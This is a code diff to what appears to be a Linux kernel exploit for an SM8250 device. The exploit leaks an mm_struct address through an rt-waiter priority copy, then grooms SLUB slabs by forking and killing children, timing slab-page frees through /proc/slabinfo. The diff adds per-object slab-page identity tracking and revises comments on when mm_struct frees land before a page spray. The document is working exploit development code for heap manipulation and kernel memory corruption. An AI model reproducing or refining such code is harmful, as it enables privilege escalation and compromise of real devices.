@@ -4,6 +4,7 @@
 #include "kernel_page/gate.h"
 #include "kernel_page/run_state.h"
 #include "kernel_page/address_cache.h"
+#include "kernel_page/identity.h"
 #include <dirent.h>
 
 /* The emptying free must run on a CPU whose c->page is not base, or
@@ -2240,11 +2241,20 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   leak_stage_failed = 0;
   ks_discard_failed = 0;
   long baseline_slabs = -1;
+  /* Per-object slab-page identity: measured geometry, the one address the
+   * leak recovers, and one table row per burst slot. */
+  struct kp_geometry kp_geo;
+  struct kp_identity kp_anchor;
   /* SLUB object stride, not logical mm_struct size: 0x388 + 8-byte
    * cpumask (CONFIG_NR_CPUS=8) = 0x390 request, HWCACHE_ALIGN to the
    * SM8250 64-byte cache line -> 0x3c0 (see rt-waiter-placement-audit.md). */
   /* SLUB object stride (ALIGN(sizeof, cache line)), not the logical size. */
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  /* Slabinfo reports objsize/objperslab/pagesperslab, so the slab span
+   * does not have to be assumed from ORDER3_SIZE.  The line also prints
+   * whether those constants agree with the kernel's own numbers. */
+  kp_identity_read(&kp_geo);
+  kp_identity_surface(&kp_geo, (long)mm_objs_per_slab, (long)ORDER3_SIZE);
   mm_slab_counts(NULL, &baseline_slabs);
   mm_slab_log("baseline");
   prepare_ctxs();
@@ -2652,6 +2662,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pr_info("KSLAB_BASE_CANDIDATE mm=%016zx base=%016zx idx=%d\n",
           leaked, base, slab_base_candidate % MM_SLAB_CANDIDATE_PAGES);
   slab_base_candidate++;
+  /* The leak child is the second allocation from the burst slab
+   * (KS_PRE leak_slot=1), so a correct resolution lands on slot 1. */
+  (void)kp_identity_anchor(&kp_geo, leaked, 1, &kp_anchor);
   /* Point the chain-walk owner at the mm_struct so the
    * "waiter->prio = task->prio" copy leaks *(int *)mm_va into the SKB. */
   g_leak_target = leaked;
@@ -2908,9 +2921,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
   sched_yield();
   sched_yield();
-  /* mmput() -> __mmput() -> mmdrop_async() defers free_mm() to an RCU
-   * callback, so the objects are still allocated for a while after
-   * kill_child() returns.  A fixed sleep is the wrong tool: too short and the
+  /* exit_mm() -> mmput() -> __mmput() -> mmdrop() frees the mm_struct
+   * inside the child's own exit (kernel/exit.c; kernel/fork.c:1069-1100),
+   * and kill_child() reaps the task, so the object is gone when it returns.
+   * Which page the cache then exposes is a separate question.  A fixed
+   * sleep is the wrong tool: too short and the
    * spray runs while the page is still owned by the slab (2026-10-31: the
    * cache showed all 2208 objects live at pre-spray and only 1985 after the
    * sends), too long and the freed page has a blind window in which any other
@@ -3002,9 +3017,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
             (size_t)base, (size_t)(base ^ (uintptr_t)ORDER3_SIZE),
             buddy_hold_n, post_ctx.mm_cnt + control_cnt);
     {
-      /* The other children's mm frees are RCU-deferred through
-       * mmdrop_async(); wait (bounded) for their slabs to land before
-       * taking the isolation sample. */
+      /* The other children's mm frees are synchronous with their exits
+       * and are reaped by kill_child(), so they have landed here; the
+       * bounded wait lets the cache's counters settle before the
+       * isolation sample is taken. */
       long s0 = -1;
       mm_slab_counts(NULL, &s0);
       for (int i = 0; i < 50; ++i) {
@@ -3031,6 +3047,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       int memfds;
       ssize_t head_warm = -1;
       size_t freeze_kill = 0;
+      int target_state_at_freeze = 0;
       int crossed_at = -1;
       int target_freed_at_cross = 0;
       int empty_registered = 0;
@@ -3125,6 +3142,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           }
         }
         tst = task_state_char(target);
+        target_state_at_freeze = tst;
         exclusive = (zombie == 0 && gone == 0 && tst != 0 && tst != 'Z' &&
                      tst != 'X');
         pr_info("KS_SLAB_ALIVE slots=%zu alive=%zu zombie=%zu gone=%zu "
@@ -3340,14 +3358,59 @@ uintptr_t prepare_kernel_page(int payload_mode) {
         {
           long fa0 = -1, fn0 = -1, fs0 = -1;
           long fa1 = -1, fn1 = -1, fs1 = -1;
+          double id_t0 = ks_now_ms();
+          double id_sample_ms = 0.0;
           if (post_f != NULL) {
             rewind(post_f);
             (void)mm_slab_scan(post_f, &fa0, &fn0, &fs0);
           }
-          for (size_t i = 0; i < freeze_kill; i++) {
-            kill_child(pre_ctx.childs[i]);
-            pre_ctx.childs[i] = -1;
+          /* One sample per object, not two: each row's "after" is the next
+           * row's "before".  KS_ID_COST reports both halves of what this
+           * loop costs: the samples (a /proc/slabinfo read regenerates the
+           * whole cache list) and the kills, which the bulk loop this
+           * replaces also paid. */
+          {
+            long sa0 = -1, sn0 = -1, ss0 = -1;
+            double st0 = ks_now_ms();
+            if (post_f != NULL) {
+              rewind(post_f);
+              (void)mm_slab_scan(post_f, &sa0, &sn0, &ss0);
+            }
+            id_sample_ms += ks_now_ms() - st0;
+            for (size_t i = 0; i < freeze_kill; i++) {
+              const char *alive;
+              long sa1 = -1, sn1 = -1, ss1 = -1;
+              int sampled;
+              int st = task_state_char(pre_ctx.childs[i]);
+              alive = st == 0 ? "gone"
+                              : (st == 'Z' || st == 'X') ? "zombie"
+                                                         : "yes";
+              /* kill_child() reaps the task, and exit_mm() -> mmput() ->
+               * __mmput() -> kmem_cache_free() runs inside that exit
+               * (kernel/exit.c; kernel/fork.c:1069-1100), so the sample
+               * below is taken after this object's free, not before it. */
+              kill_child(pre_ctx.childs[i]);
+              pre_ctx.childs[i] = -1;
+              st0 = ks_now_ms();
+              if (post_f != NULL) {
+                rewind(post_f);
+                (void)mm_slab_scan(post_f, &sa1, &sn1, &ss1);
+              }
+              id_sample_ms += ks_now_ms() - st0;
+              sampled = (sa0 >= 0 && sn0 >= 0 && ss0 >= 0 && sa1 >= 0 &&
+                         sn1 >= 0 && ss1 >= 0);
+              kp_identity_slot(i, alive, sampled,
+                               sampled ? sa1 - sa0 : 0,
+                               sampled ? sn1 - sn0 : 0,
+                               sampled ? ss1 - ss0 : 0, &kp_anchor);
+              sa0 = sa1;
+              sn0 = sn1;
+              ss0 = ss1;
+            }
           }
+          pr_info("KS_ID_COST slots=%zu loop_us=%.0f sample_us=%.0f\n",
+                  freeze_kill, (ks_now_ms() - id_t0) * 1000.0,
+                  id_sample_ms * 1000.0);
           /* Sampled before the control's fillers are freed: this window
            * contains the anchor's 31 frees and nothing else. */
           if (post_f != NULL) {
@@ -3375,13 +3438,14 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           pr_info("KS_CTL_FREEZE fillers=%zu kept_pid=%d cpu=%d\n",
                   control_cnt - 1, (int)control_last, sched_getcpu());
         }
-        /* The filler frees above are mmdrop_async() RCU callbacks.  If the
-         * crossing below runs before they land, their put_cpu_partial()
-         * re-freezes base's page after unfreeze_partials() already walked the
-         * list, and the target's free then takes FREE_FROZEN: inuse and
-         * active_objs do not move and the gate refuses (measured d_empty=0).
-         * Give the callbacks a bounded window to run while the page is
-         * frozen and therefore untouchable, then take the sample. */
+        /* The filler frees above are synchronous with the children's exits
+         * and reaped (kill_child -> waitpid), so base's page already has
+         * inuse 1 here.  A put_cpu_partial() from a later free can still
+         * re-freeze the page after unfreeze_partials() walked the list, and
+         * the target's free then takes FREE_FROZEN: inuse and active_objs do
+         * not move and the gate refuses (measured d_empty=0).  The settling
+         * window below is kept from the cycles that measured that; whether
+         * it is still needed with synchronous frees is not established. */
         usleep(2000);
         pr_info("KS_FREEZE_WAIT ms=2 cpu=%d\n", sched_getcpu());
         if (post_f != NULL) {
@@ -3830,6 +3894,21 @@ uintptr_t prepare_kernel_page(int payload_mode) {
               whole_slab_discard, image_done, free_to_send_ms,
               empty_active - cross_active, empty_num - cross_num,
               empty_slabs - cross_slabs, pin_bad, slot_partial, targeted);
+      /* The emptying free's row, from the samples the gate already took:
+       * no /proc read is added between that free and the sends. */
+      kp_identity_slot(pre_ctx.mm_cnt - 1,
+                       target_state_at_freeze == 0
+                           ? "gone"
+                           : (target_state_at_freeze == 'Z' ||
+                              target_state_at_freeze == 'X')
+                                 ? "zombie"
+                                 : "yes",
+                       (empty_active >= 0 && cross_active >= 0 &&
+                        empty_num >= 0 && cross_num >= 0 &&
+                        empty_slabs >= 0 && cross_slabs >= 0),
+                       empty_active - cross_active, empty_num - cross_num,
+                       empty_slabs - cross_slabs, &kp_anchor);
+      kp_identity_summary(pre_ctx.mm_cnt, kp_anchor.page ? 1 : 0);
       if (empty_registered) {
         kp_result_mark(KP_ALLOCATOR_TRANSITION_VERIFIED);
       }
